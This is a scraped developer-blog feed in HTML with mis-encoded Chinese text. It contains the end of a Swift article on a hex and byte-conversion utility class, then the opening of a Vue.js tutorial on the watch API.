        <span class="hljs-keyword">return</span> components.joined(separator: <span class="hljs-string">" "</span>)
    }
    
    <span class="hljs-comment">/// å°†çº¯åå…­è¿›åˆ¶å­—ç¬¦ä¸²è½¬ä¸ºå¸¦ 0x å‰ç¼€ã€é€—å·åˆ†éš”æ ¼å¼</span>
    <span class="hljs-comment">/// - Example: `"aabbccdd"` -&gt; `"0xaa, 0xbb, 0xcc, 0xdd"`</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">describeBytesFormat</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">dataString</span>: <span class="hljs-type">String</span>) -&gt; <span class="hljs-type">String</span> {
        <span class="hljs-keyword">guard</span> <span class="hljs-operator">!</span>dataString.isEmpty <span class="hljs-keyword">else</span> { <span class="hljs-keyword">return</span> <span class="hljs-string">""</span> }
        <span class="hljs-keyword">guard</span> dataString.count <span class="hljs-operator">%</span> <span class="hljs-number">2</span> <span class="hljs-operator">==</span> <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> { <span class="hljs-keyword">return</span> dataString }
        
        <span class="hljs-keyword">var</span> components: [<span class="hljs-type">String</span>] <span class="hljs-operator">=</span> []
        <span class="hljs-keyword">var</span> index <span class="hljs-operator">=</span> dataString.startIndex
        
        <span class="hljs-keyword">while</span> index <span class="hljs-operator">&lt;</span> dataString.endIndex {
            <span class="hljs-keyword">let</span> nextIndex <span class="hljs-operator">=</span> dataString.index(index, offsetBy: <span class="hljs-number">2</span>)
            <span class="hljs-keyword">let</span> byte <span class="hljs-operator">=</span> <span class="hljs-type">String</span>(dataString[index<span class="hljs-operator">..&lt;</span>nextIndex])
            components.append(<span class="hljs-string">"0x<span class="hljs-subst">\(byte)</span>"</span>)
            index <span class="hljs-operator">=</span> nextIndex
        }
        
        <span class="hljs-keyword">return</span> components.joined(separator: <span class="hljs-string">", "</span>)
    }
    
    <span class="hljs-comment">// MARK: - å¤§å°ç«¯ä¸å­—ç¬¦ä¸²å¤„ç†</span>
    
    <span class="hljs-comment">/// å°†å­—ç¬¦ä¸²è§†ä¸ºå°ç«¯åå…­è¿›åˆ¶è¡¨ç¤ºï¼Œè½¬ä¸ºå¤§ç«¯æ˜¾ç¤ºï¼ˆæŒ‰å­—èŠ‚å€’åºï¼‰</span>
    <span class="hljs-comment">/// - Parameter string: å°ç«¯å­—èŠ‚åºè¡¨ç¤ºçš„å­—ç¬¦ä¸²</span>
    <span class="hljs-comment">/// - Returns: æŒ‰å¤§ç«¯é¡ºåºæ˜¾ç¤ºçš„åå…­è¿›åˆ¶å­—ç¬¦ä¸²</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">transStringToBigMode</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">string</span>: <span class="hljs-type">String</span>) -&gt; <span class="hljs-type">String</span> {
        <span class="hljs-keyword">return</span> invertedOrder(string)
    }
    
    <span class="hljs-comment">/// åè½¬ Data çš„å­—èŠ‚é¡ºåºï¼ˆå¤§å°ç«¯è½¬æ¢æ—¶å¯ç”¨ï¼‰</span>
    <span class="hljs-comment">/// - Parameter data: åŸå§‹æ•°æ®</span>
    <span class="hljs-comment">/// - Returns: å­—èŠ‚åè½¬åçš„æ•°æ®</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">convert</span>(<span class="hljs-params">data</span>: <span class="hljs-type">Data</span>) -&gt; <span class="hljs-type">Data</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-type">Data</span>(data.reversed())
    }
    
    <span class="hljs-comment">/// å°† 16 ä½æ— ç¬¦å·æ•°çš„é«˜ä½å­—èŠ‚äº’æ¢</span>
    <span class="hljs-comment">/// - Parameter len: åŸå§‹ Int</span>
    <span class="hljs-comment">/// - Returns: å­—èŠ‚äº¤æ¢ä¹‹åçš„ UInt16</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">numswap</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">len</span>: <span class="hljs-type">Int</span>) -&gt; <span class="hljs-type">UInt16</span> {
        <span class="hljs-keyword">let</span> value <span class="hljs-operator">=</span> <span class="hljs-type">UInt16</span>(len)
        <span class="hljs-keyword">return</span> (value <span class="hljs-operator">&gt;&gt;</span> <span class="hljs-number">8</span>) <span class="hljs-operator">|</span> (value <span class="hljs-operator">&lt;&lt;</span> <span class="hljs-number">8</span>)
    }
    
    <span class="hljs-comment">// MARK: - å¼‚æˆ–è®¡ç®—ä¸æ ¡éªŒ</span>
    
    <span class="hljs-comment">/// å¯¹åå…­è¿›åˆ¶å­—ç¬¦ä¸²ä¸­çš„æ¯ä¸ªå­—èŠ‚åšå¼‚æˆ–è¿ç®—</span>
    <span class="hljs-comment">/// - Parameter dataString: ä¾‹å¦‚ `"030a2713ea"`</span>
    <span class="hljs-comment">/// - Returns: å¼‚æˆ–ç»“æœï¼Œä¾‹å¦‚ `"5f"`ï¼ˆä¸¾ä¾‹ï¼‰</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">xor</span>(<span class="hljs-params">dataString</span>: <span class="hljs-type">String</span>) -&gt; <span class="hljs-type">String</span> {
        <span class="hljs-keyword">guard</span> <span class="hljs-operator">!</span>dataString.isEmpty, dataString.count <span class="hljs-operator">%</span> <span class="hljs-number">2</span> <span class="hljs-operator">==</span> <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> { <span class="hljs-keyword">return</span> <span class="hljs-string">"00"</span> }
        
        <span class="hljs-keyword">var</span> xorResult: <span class="hljs-type">UInt8</span> <span class="hljs-operator">=</span> <span class="hljs-number">0x00</span>
        <span class="hljs-keyword">var</span> index <span class="hljs-operator">=</span> dataString.startIndex
        
        <span class="hljs-keyword">while</span> index <span class="hljs-operator">&lt;</span> dataString.endIndex {
            <span class="hljs-keyword">let</span> nextIndex <span class="hljs-operator">=</span> dataString.index(index, offsetBy: <span class="hljs-number">2</span>)
            <span class="hljs-keyword">let</span> byteStr <span class="hljs-operator">=</span> <span class="hljs-type">String</span>(dataString[index<span class="hljs-operator">..&lt;</span>nextIndex])
            <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> byte <span class="hljs-operator">=</span> <span class="hljs-type">UInt8</span>(byteStr, radix: <span class="hljs-number">16</span>) {
                xorResult <span class="hljs-operator">^=</span> byte
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-keyword">return</span> <span class="hljs-string">"00"</span>
            }
            index <span class="hljs-operator">=</span> nextIndex
        }
        
        <span class="hljs-keyword">return</span> <span class="hljs-type">String</span>(format: <span class="hljs-string">"%02x"</span>, xorResult)
    }
    
    <span class="hljs-comment">/// å¯¹ Data çš„æ‰€æœ‰å­—èŠ‚åšå¼‚æˆ–ï¼Œå†ä¸ç»™å®šå€¼æ¯”è¾ƒæ˜¯å¦ä¸€è‡´</span>
    <span class="hljs-comment">/// - Parameters:</span>
    <span class="hljs-comment">///   - imageData: äºŒè¿›åˆ¶æ•°æ®ï¼ˆæ¯”å¦‚å›¾ç‰‡åŸå§‹ Dataï¼‰</span>
    <span class="hljs-comment">///   - xorValue: æœŸæœ›çš„å¼‚æˆ–ç»“æœ</span>
    <span class="hljs-comment">/// - Returns: æ˜¯å¦åŒ¹é…</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">compareImageData</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">imageData</span>: <span class="hljs-type">Data</span>, <span class="hljs-params">withXORValue</span> <span class="hljs-params">xorValue</span>: <span class="hljs-type">Int</span>) -&gt; <span class="hljs-type">Bool</span> {
        <span class="hljs-keyword">guard</span> <span class="hljs-operator">!</span>imageData.isEmpty <span class="hljs-keyword">else</span> { <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span> }
        
        <span class="hljs-keyword">var</span> result: <span class="hljs-type">UInt8</span> <span class="hljs-operator">=</span> <span class="hljs-number">0x00</span>
        imageData.forEach { byte <span class="hljs-keyword">in</span>
            result <span class="hljs-operator">^=</span> byte
        }
        
        <span class="hljs-keyword">return</span> result <span class="hljs-operator">==</span> <span class="hljs-type">UInt8</span>(xorValue <span class="hljs-operator">&amp;</span> <span class="hljs-number">0xFF</span>)
    }
    
    <span class="hljs-comment">// MARK: - å®‰å…¨çš„æ•°æ®è£å‰ª</span>
    
    <span class="hljs-comment">/// å®‰å…¨è£å‰ª Dataï¼Œå¦‚æœè¶Šç•Œåˆ™è¿”å›ç©º Dataï¼Œè€Œä¸æ˜¯å´©æºƒ</span>
    <span class="hljs-comment">/// - Parameters:</span>
    <span class="hljs-comment">///   - data: åŸå§‹æ•°æ®</span>
    <span class="hljs-comment">///   - range: NSRangeï¼ˆé€šå¸¸æ¥è‡ªå¤–éƒ¨åè®®å®šä¹‰ï¼‰</span>
    <span class="hljs-comment">/// - Returns: å­ Data æˆ–ç©º Data</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">subData</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">data</span>: <span class="hljs-type">Data</span>, <span class="hljs-params">range</span>: <span class="hljs-type">NSRange</span>) -&gt; <span class="hljs-type">Data</span> {
        <span class="hljs-keyword">guard</span> <span class="hljs-operator">!</span>data.isEmpty <span class="hljs-keyword">else</span> { <span class="hljs-keyword">return</span> <span class="hljs-type">Data</span>() }
        <span class="hljs-keyword">let</span> start <span class="hljs-operator">=</span> range.location
        <span class="hljs-keyword">let</span> end <span class="hljs-operator">=</span> range.location <span class="hljs-operator">+</span> range.length
        
        <span class="hljs-keyword">guard</span> start <span class="hljs-operator">&gt;=</span> <span class="hljs-number">0</span>,
              range.length <span class="hljs-operator">&gt;=</span> <span class="hljs-number">0</span>,
              end <span class="hljs-operator">&lt;=</span> data.count <span class="hljs-keyword">else</span> {
            <span class="hljs-keyword">return</span> <span class="hljs-type">Data</span>()
        }
        
        <span class="hljs-keyword">let</span> swiftRange <span class="hljs-operator">=</span> start<span class="hljs-operator">..&lt;</span>end
        <span class="hljs-keyword">return</span> data.subdata(in: swiftRange)
    }
}

</code></pre>
<p>ç®€å•ä½¿ç”¨ç¤ºä¾‹</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">let</span> hex <span class="hljs-operator">=</span> <span class="hljs-string">"aabbccdd"</span>

<span class="hljs-comment">// Hex -&gt; Data</span>
<span class="hljs-keyword">let</span> data <span class="hljs-operator">=</span> <span class="hljs-type">ParseDataTool</span>.transToData(hexString: hex)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"data ="</span>, data <span class="hljs-keyword">as</span> <span class="hljs-type">NSData</span>)

<span class="hljs-comment">// Data -&gt; Hex</span>
<span class="hljs-keyword">let</span> hexStr <span class="hljs-operator">=</span> <span class="hljs-type">ParseDataTool</span>.transDataToHexString(data)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"hexStr ="</span>, hexStr)      <span class="hljs-comment">// aabbccdd</span>

<span class="hljs-comment">// å­—èŠ‚å€’åº</span>
<span class="hljs-keyword">let</span> inverted <span class="hljs-operator">=</span> <span class="hljs-type">ParseDataTool</span>.invertedOrder(hex)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"inverted ="</span>, inverted)  <span class="hljs-comment">// ddccbbaa</span>

<span class="hljs-comment">// å¯è¯»æ ¼å¼</span>
<span class="hljs-built_in">print</span>(<span class="hljs-type">ParseDataTool</span>.describeBlankFormat(hex))     <span class="hljs-comment">// aa bb cc dd</span>
<span class="hljs-built_in">print</span>(<span class="hljs-type">ParseDataTool</span>.describeBytesFormat(hex))     <span class="hljs-comment">// 0xaa, 0xbb, 0xcc, 0xdd</span>

<span class="hljs-comment">// å°ç«¯ Data -&gt; Int</span>
<span class="hljs-keyword">let</span> littleEndian <span class="hljs-operator">=</span> <span class="hljs-type">ParseDataTool</span>.transToData(hexString: <span class="hljs-string">"78563412"</span>)
<span class="hljs-keyword">let</span> intValue <span class="hljs-operator">=</span> <span class="hljs-type">ParseDataTool</span>.transLittleEndianDataToInteger(littleEndian)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"intValue ="</span>, intValue)  <span class="hljs-comment">// 305419896 (0x12345678)</span>

</code></pre>
<p>è¿™ç¯‡æ–‡ç« æŠŠæˆ‘ä¹‹å‰åœ¨å®é™…å¼€å‘é¡¹ç›®ä¸­åŸæ¥çš„ä½¿ç”¨åˆ°äºŒè¿›åˆ¶çš„ç›¸å…³è½¬æ¢å¤„ç†ï¼Œå®Œæ•´è¿ç§»æˆäº† <strong>Swift ç‰ˆæœ¬ ParseDataTool.swift</strong>ï¼ŒåŒæ—¶ï¼š</p>
<ul>
<li>ä¿ç•™äº†åŸæœ‰çš„æ‰€æœ‰åŠŸèƒ½æ–¹æ³•ï¼›</li>
<li>æŒ‰ç…§ Swift çš„ä¹ æƒ¯ä½¿ç”¨äº† <code>static func</code>ã€<code>Data</code>ã€<code>String</code> çš„å®‰å…¨ä¸‹æ ‡ç­‰ï¼›</li>
<li>åœ¨ä¸æ”¹å˜è¯­ä¹‰çš„å‰æä¸‹ï¼Œåšäº†ä¸€äº›æ›´â€œSwift é£æ ¼â€çš„å°è£…ã€‚</li>
</ul>
<p>ä½ å¯ä»¥ç›´æ¥åœ¨é¡¹ç›®ä¸­åˆ›å»ºä¸€ä¸ª <code>ParseDataTool.swift</code> æ–‡ä»¶ï¼ŒæŠŠä¸Šé¢çš„ä»£ç è´´è¿›å»å°±èƒ½ç”¨.</p>
<p>å¦‚æœ‰è¯´é”™çš„åœ°æ–¹æ¬¢è¿æŒ‡æ­£ï¼Œç›¸äº’å­¦ä¹ ~</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vueä¸­çš„watch]]></title>    <link>https://juejin.cn/post/7580971667037339674</link>    <guid>https://juejin.cn/post/7580971667037339674</guid>    <pubDate>2025-12-08T05:43:42.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580971667037339674" data-draft-id="7581025279645614118" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vueä¸­çš„watch"/> <meta itemprop="keywords" content="Vue.js"/> <meta itemprop="datePublished" content="2025-12-08T05:43:42.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é†’äº†æ¥ç€ç¡"/> <meta itemprop="url" content="https://juejin.cn/user/2113684267875592"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vueä¸­çš„watch
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2113684267875592/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é†’äº†æ¥ç€ç¡
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T05:43:42.000Z" title="Mon Dec 08 2025 05:43:42 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»10åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">æ·±å…¥ç†è§£ <code>watch</code></h2>
<p><code>watch</code> æ˜¯ <code>Vue</code> ç»„åˆå¼ <code>API (Composition API)</code> ä¸­çš„ä¸€ä¸ªæ ¸å¿ƒåŠŸèƒ½ï¼Œå®ƒå…è®¸æˆ‘ä»¬<strong>ä¾¦å¬</strong>ä¸€ä¸ªæˆ–å¤šä¸ªå“åº”å¼æ•°æ®æºï¼Œå¹¶åœ¨æ•°æ®æºå˜åŒ–æ—¶æ‰§è¡Œä¸€ä¸ª<strong>å›è°ƒå‡½æ•°</strong>ã€‚è¿™å¯¹äºæ‰§è¡Œå¼‚æ­¥æ“ä½œæˆ–åŸºäºæ•°æ®å˜åŒ–æ‰§è¡Œå¤æ‚é€»è¾‘éå¸¸æœ‰ç”¨ã€‚</p>
<h4 data-id="heading-1">1. åŸºæœ¬ç”¨æ³•</h4>
<p>æœ€ç®€å•çš„ç”¨æ³•æ˜¯ä¾¦å¬ä¸€ä¸ª <code>ref</code>ã€‚</p>
<ul>
<li>å‚æ•° ï¼š
<ol>
<li><code>watch</code> çš„ç¬¬ä¸€ä¸ªå‚æ•°å¯ä»¥æ˜¯ä¸åŒå½¢å¼çš„â€œæ•°æ®æºâ€ï¼šå®ƒå¯ä»¥æ˜¯ä¸€ä¸ª <code>ref </code>(åŒ…æ‹¬è®¡ç®—å±æ€§)ã€ä¸€ä¸ªå“åº”å¼å¯¹è±¡ã€ä¸€ä¸ª <a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fzh-CN%2Fdocs%2FWeb%2FJavaScript%2FReference%2FFunctions%2Fget%23description" target="_blank" title="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Functions/get#description" ref="nofollow noopener noreferrer">getter å‡½æ•°</a>ã€æˆ–å¤šä¸ªæ•°æ®æºç»„æˆçš„æ•°ç»„ï¼š</li>
<li>æ•°æ®å˜åŒ–æ—¶æ‰§è¡Œçš„å›è°ƒå‡½æ•°ï¼Œè¯¥å‡½æ•°æ¥æ”¶æ–°å€¼ (<code>newValue</code>) å’Œæ—§å€¼ (<code>oldValue</code>)ã€‚</li>
</ol>
</li>
</ul>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> { ref, watch } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-comment">// 1. å®šä¹‰ä¸€ä¸ªå“åº”å¼æ•°æ®</span>
<span class="hljs-keyword">const</span> count = <span class="hljs-title function_">ref</span>(<span class="hljs-number">0</span>)
<span class="hljs-comment">// 2. ä¾¦å¬ count çš„å˜åŒ–</span>
<span class="hljs-title function_">watch</span>(count, <span class="hljs-function">(<span class="hljs-params">newValue, oldValue</span>) =&gt;</span> {
 <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`count ä» <span class="hljs-subst">${oldValue}</span> å˜æˆäº† <span class="hljs-subst">${newValue}</span>`</span>)
})
<span class="hljs-comment">// 3. ä¿®æ”¹æ•°æ®ä»¥è§¦å‘ watch</span>
<span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
 count.<span class="hljs-property">value</span>++ <span class="hljs-comment">// æ§åˆ¶å°å°†è¾“å‡º: "count ä» 0 å˜æˆäº† 1"</span>
}, <span class="hljs-number">1000</span>)
</code></pre>
<h4 data-id="heading-2">2. ä¾¦å¬å“åº”å¼å¯¹è±¡</h4>
<p>å½“ä¾¦å¬ä¸€ä¸ª <code>reactive</code> å¯¹è±¡æ—¶ï¼Œ<code>watch</code> ä¼šéšå¼åœ°åˆ›å»ºä¸€ä¸ª<strong>æ·±å±‚ä¾¦å¬å™¨</strong>ã€‚è¿™æ„å‘³ç€å¯¹è±¡å†…éƒ¨ä»»ä½•åµŒå¥—å±æ€§çš„å˜åŒ–éƒ½ä¼šè§¦å‘å›è°ƒã€‚</p>
<p><strong>æ³¨æ„</strong>ï¼šæ­¤æ—¶ <code>newValue</code> å’Œ <code>oldValue</code> å°†æ˜¯åŒä¸€ä¸ªå¯¹è±¡å¼•ç”¨ï¼Œå› ä¸ºå®ƒä»¬éƒ½æŒ‡å‘åŒä¸€ä¸ª <code>reactive</code> å¯¹è±¡ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> { reactive, watch } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>

<span class="hljs-keyword">const</span> state = <span class="hljs-title function_">reactive</span>({
 <span class="hljs-attr">id</span>: <span class="hljs-number">1</span>,
 <span class="hljs-attr">user</span>: {
  <span class="hljs-attr">name</span>: <span class="hljs-string">'Alice'</span>,
  <span class="hljs-attr">age</span>: <span class="hljs-number">20</span>
 }
})

<span class="hljs-title function_">watch</span>(state, <span class="hljs-function">(<span class="hljs-params">newState, oldState</span>) =&gt;</span> {
 <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'state å¯¹è±¡å‘ç”Ÿäº†å˜åŒ–'</span>)
 <span class="hljs-comment">// æ³¨æ„ï¼šnewState === oldState</span>
})
<span class="hljs-comment">// ä¿®æ”¹åµŒå¥—å±æ€§ä¼šè§¦å‘ watch</span>
state.<span class="hljs-property">user</span>.<span class="hljs-property">age</span>++ <span class="hljs-comment">// æ§åˆ¶å°å°†è¾“å‡º: "state å¯¹è±¡å‘ç”Ÿäº†å˜åŒ–"</span>
</code></pre>
<h4 data-id="heading-3">3. ä¾¦å¬ Getter å‡½æ•°</h4>
<p>ä¸ºäº†æ›´ç²¾ç¡®åœ°æ§åˆ¶ä¾¦å¬çš„ç›®æ ‡ï¼Œæˆ–è€…åªä¾¦å¬<strong>å“åº”å¼å¯¹è±¡ä¸­çš„æŸä¸ªå±æ€§</strong>ï¼Œæˆ‘ä»¬å¯ä»¥å‘ <code>watch</code> ä¼ é€’ä¸€ä¸ª <strong>getter å‡½æ•°</strong> <code>() =&gt; ...</code>ã€‚</p>
<p>è¿™æ˜¯æœ€å¸¸ç”¨å’Œæ¨èçš„æ–¹å¼ä¹‹ä¸€ï¼Œå› ä¸ºå®ƒå…·æœ‰æ›´å¥½çš„æ€§èƒ½å’Œæ›´æ˜ç¡®çš„æ„å›¾ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// ...æ¥ä¸Šä¸€ä¸ªä¾‹å­</span>
<span class="hljs-comment">// åªä¾¦å¬ state.user.age çš„å˜åŒ–</span>
<span class="hljs-title function_">watch</span>(
 <span class="hljs-function">() =&gt;</span> state.<span class="hljs-property">user</span>.<span class="hljs-property">age</span>,
 <span class="hljs-function">(<span class="hljs-params">newAge, oldAge</span>) =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`å¹´é¾„ä» <span class="hljs-subst">${oldAge}</span> å˜æˆäº† <span class="hljs-subst">${newAge}</span>`</span>)
 }
)
state.<span class="hljs-property">user</span>.<span class="hljs-property">age</span>++ <span class="hljs-comment">// æ§åˆ¶å°å°†è¾“å‡º: "å¹´é¾„ä» 20 å˜æˆäº† 21"</span>
state.<span class="hljs-property">id</span>++    <span class="hljs-comment">// ä¸ä¼šè§¦å‘è¿™ä¸ª watch</span>
</code></pre>
<p>ç›¸æ¯”<strong>ä¾¦å¬å“åº”å¼å¯¹è±¡</strong>ï¼Œä¸€ä¸ªè¿”å›å“åº”å¼å¯¹è±¡çš„ <code>getter</code> å‡½æ•°ï¼Œåªæœ‰åœ¨è¿”å›ä¸åŒçš„å¯¹è±¡æ—¶ï¼Œæ‰ä¼šè§¦å‘å›è°ƒï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-title function_">watch</span>(
  <span class="hljs-function">() =&gt;</span> state.<span class="hljs-property">someObject</span>,
  <span class="hljs-function">(<span class="hljs-params">newValue, oldValue</span>) =&gt;</span> {
    <span class="hljs-comment">// æ³¨æ„ï¼š`newValue` æ­¤å¤„å’Œ `oldValue` æ˜¯ç›¸ç­‰çš„</span>
    <span class="hljs-comment">// *é™¤é* state.someObject è¢«æ•´ä¸ªæ›¿æ¢äº†</span>
  },
  { <span class="hljs-attr">deep</span>: <span class="hljs-literal">true</span> }	<span class="hljs-comment">// å¯ä»¥ç»™ä¸Šé¢è¿™ä¸ªä¾‹å­æ˜¾å¼åœ°åŠ ä¸Š deep é€‰é¡¹ï¼Œå¼ºåˆ¶è½¬æˆæ·±å±‚ä¾¦å¬å™¨ï¼š</span>
)
</code></pre>
<h4 data-id="heading-4">4. ä¾¦å¬å¤šä¸ªæ•°æ®æº</h4>
